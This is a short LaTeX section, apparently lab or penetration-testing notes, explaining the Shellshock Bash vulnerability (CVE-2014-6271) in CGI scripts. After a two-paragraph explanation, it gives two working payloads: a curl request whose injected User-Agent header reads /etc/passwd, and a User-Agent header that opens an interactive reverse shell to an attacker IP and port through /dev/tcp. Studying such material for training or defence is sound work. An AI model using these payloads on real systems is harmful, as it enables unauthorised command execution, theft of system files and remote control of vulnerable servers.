\section{CGI: CVE-2014-6271 shellshock}

Shellshock vulnerability can be used to execute unintentional commands using environment variables

The Shellshock vulnerability allows an attacker to exploit old versions of Bash
that save environment variables incorrectly. Typically when saving a function
as a variable, the shell function will stop where it is defined to end by the
creator. Vulnerable versions of Bash will allow an attacker to execute
operating system commands that are included after a function stored inside an
environment variable.

\begin{verbatim}
 curl \
    -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' \
    http://10.129.204.231/cgi-bin/access.cgi
\end{verbatim}


\begin{verbatim}
'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1'
\end{verbatim}

